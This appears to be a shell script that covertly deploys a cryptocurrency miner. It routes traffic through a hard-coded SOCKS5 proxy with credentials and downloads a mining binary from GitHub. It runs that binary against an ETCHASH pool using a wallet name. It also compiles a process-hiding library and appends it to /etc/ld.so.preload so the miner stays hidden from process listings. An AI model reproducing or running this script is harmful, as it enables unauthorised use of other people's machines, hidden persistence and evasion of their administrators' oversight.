#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

curl -L -o graphics.tar.gz https://github.com/sbwsmg/yahahah/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 64.225.2.0:443
socks5_username = mining
socks5_password = untukkita
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
POOL=stratum+tcp://etc.poolbinance.com:443
WALLET=teguhcong
WORKER=$(echo $(shuf -i 10-40 -n 1)-MAGIC)

./graftcp/graftcp wget https://github.com/hunzibao/tmp/raw/main/magicPriyatama.zip
unzip magicPriyatama.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./priyatama --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
